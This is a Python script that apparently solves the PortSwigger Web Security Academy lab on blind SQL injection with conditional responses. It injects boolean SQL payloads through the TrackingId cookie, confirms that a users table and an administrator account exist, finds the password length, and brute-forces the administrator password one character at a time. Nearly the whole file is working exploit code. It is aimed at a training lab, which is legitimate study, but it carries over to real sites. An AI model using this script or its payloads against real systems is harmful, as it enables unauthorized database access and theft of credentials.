# Web Security Academy Port Swigger
# Blind SQL injection with conditional responses lab
#
import requests
import string
import sys
import argparse
import threading
import itertools
import time
from urllib.parse import quote_plus


parser = argparse.ArgumentParser()
parser.add_argument("url", help="URL to vulnerable site")
args = parser.parse_args()


characters = string.ascii_lowercase + string.digits
message = "Welcome back"
password_length = 0

sqls = {
    "UserTableCheck":
        "'AND (SELECT 'a' FROM users LIMIT 1)='a",
    "AdminAccountCheck":
        "' AND (SELECT 'a' FROM users WHERE username='administrator')='a",
    "PasswordLength":
        "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{0})='a",
    "PasswordBrute":
        "' AND (SELECT SUBSTRING(password,{0},1) FROM users WHERE username='administrator')='{1}"
}


def connect(track_id, sql):
    track_id += quote_plus(sql)
    session.cookies.set('TrackingId', track_id, domain='web-security-academy.net')
    res = session.get(args.url)
    return res


def print_status(msg, ch):
    sys.stdout.write('\r')
    sys.stdout.write(msg + ch)
    sys.stdout.flush()


def check_message_condition(text):
    return True if message in text else False


def check_user_table_exists(msg, track_id):
    print(msg, end=' ')
    res = connect(track_id, sqls['UserTableCheck'])
    print(check_message_condition(res.text))


def check_administrator_account(msg, track_id):
    print(msg, end=' ')
    res = connect(track_id, sqls['AdminAccountCheck'])
    print(check_message_condition(res.text))


def check_password_length(msg, track_id):
    global password_length
    progress = itertools.cycle(['/', '-', '\\', '|'])
    while True:
        print_status(msg, next(progress))
        password_length += 1
        res = connect(track_id, sqls['PasswordLength'].format(password_length))
        if check_message_condition(res.text):
            continue
        else:
            break
    print_status(msg, str(password_length) + '\n')


def brute_password(msg, track_id):
    position = 0
    password = ''
    while position < password_length:
        position += 1
        for ch in characters:
            print_status(msg + password, ch)
            res = connect(track_id, sqls['PasswordBrute'].format(position, ch))
            if check_message_condition(res.text):
                password += ch
                break

    print_status(msg, password + '\n')


session = requests.Session()
response = session.get(args.url)
tracking_id = session.cookies.get_dict()['TrackingId']


checks = {'Checking users table:': check_user_table_exists,
          'Checking Administrator account:': check_administrator_account,
          'Checking password length: ': check_password_length,
          'Extracting Admin password: ': brute_password
}

for msg, sqls_run in checks.items():
    sqls_run(msg, tracking_id)
